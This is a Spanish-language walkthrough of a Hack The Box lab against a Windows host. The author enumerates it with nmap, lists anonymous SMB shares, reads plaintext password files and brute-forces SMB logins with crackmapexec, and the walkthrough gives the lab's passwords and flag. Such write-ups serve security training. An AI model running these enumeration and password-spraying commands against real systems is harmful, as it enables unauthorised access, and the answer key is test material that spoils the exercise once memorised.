El tercer servidor es otro servidor interno que se utiliza para gestionar archivos y material de trabajo, como formularios. Además, se utiliza una base de datos en el servidor, cuya finalidad desconocemos.


**1. What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)**

Realizo una numeración básica en nmap y encuentro: 
```
PORT     STATE SERVICE    REASON          VERSION
135/tcp  open  tcpwrapped syn-ack ttl 127
445/tcp  open  tcpwrapped syn-ack ttl 127
3389/tcp open  tcpwrapped syn-ack ttl 127
| ssl-cert: Subject: commonName=WIN-HARD
| Issuer: commonName=WIN-HARD
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-20T10:10:16
| Not valid after:  2026-04-21T10:10:16
| MD5:   5d66:81e0:badb:9221:5f25:5a28:8686:ee24
| SHA-1: fcb3:b69f:21e9:6646:ad4f:7f94:368e:2426:f182:1785
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQGuDzUzGG95xJQEq84bvlVjANBgkqhkiG9w0BAQsFADAT
... ... 8/Zxvrr2GtrizcFtWTJbuc7pxEKsgo3U2YI+p7dTTHDLzX23x84HdGwt2e01J7RP
| tOJR8/O8olo=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-21T10:14:50+00:00; -3s from scanner time.

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12638/tcp): CLEAN (Timeout)
|   Check 2 (port 22036/tcp): CLEAN (Timeout)
|   Check 3 (port 50508/udp): CLEAN (Timeout)
|   Check 4 (port 18868/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -3s
|_smb2-security-mode: Couldn't establish a SMBv2 connection.

```

Puerto 135 -> RPC Endpoint Mapper de Microsoft
Puerto 445 -> SMB
Puerto 3389 -> RDP

SMB:
Con el comando:
```
smbclient -N -L //10.129.203.10

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.203.10 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```

Encuentro varios recursos. Por defecto: "ipc", "admin" y "c" son los que aparecen siempre.

Me conecto por smbclient a dicho recurso:
```
smbclient //10.129.203.10/Home
```

Y en la carpeta "simon" encuentro el recurso "random.txt".
Solución "random.txt".

**2. Enumerate the target and find a password for the user Fiona. What is her password?**

random.txt contiene unas credenciales:
```
cat random.txt                            
Credentials

(k20ASD10934kadA
KDIlalsa9020$
JT9ads02lasSA@
Kaksd032klasdA#
LKads9kasd0-@   
```

En la carpeta Fiona existia el fichero:
```
cat creds.txt 
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!

```

Mientras que en la carpeta John existian los ficheros:
```
cat information.txt 
To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.     
```

```
cat notes.txt      
Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world ...                 
```

```
cat secrets.txt 
Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123
```

Ejecuto fuerza bruta con crackmap y encuentro:
```
crackmapexec smb 10.129.203.10 -u Fiona -p creds.txt --local-auth
SMB         10.129.203.10   445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.203.10   445    WIN-HARD         [-] WIN-HARD\Fiona:Windows Creds STATUS_LOGON_FAILURE 
SMB         10.129.203.10   445    WIN-HARD         [-] WIN-HARD\Fiona: STATUS_LOGON_FAILURE 
SMB         10.129.203.10   445    WIN-HARD         [-] WIN-HARD\Fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
SMB         10.129.203.10   445    WIN-HARD         [+] WIN-HARD\Fiona:48Ns72!bns74@S84NNNSl 
```

Fiona:48Ns72!bns74@S84NNNSl 
Respuesta: 48Ns72!bns74@S84NNNSl


**3. Once logged in, what other user can we compromise to gain admin privileges?**
```
crackmapexec smb 10.129.203.10 -u john -p secrets.txt --local-auth 
SMB         10.129.203.10   445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.203.10   445    WIN-HARD         [+] WIN-HARD\john:Password Lists: 
```
Respuesta: john

**4. Submit the contents of the flag.txt file on the Administrator Desktop.**
`HTB{46u$!n9_l!nk3d_$3rv3r$}`

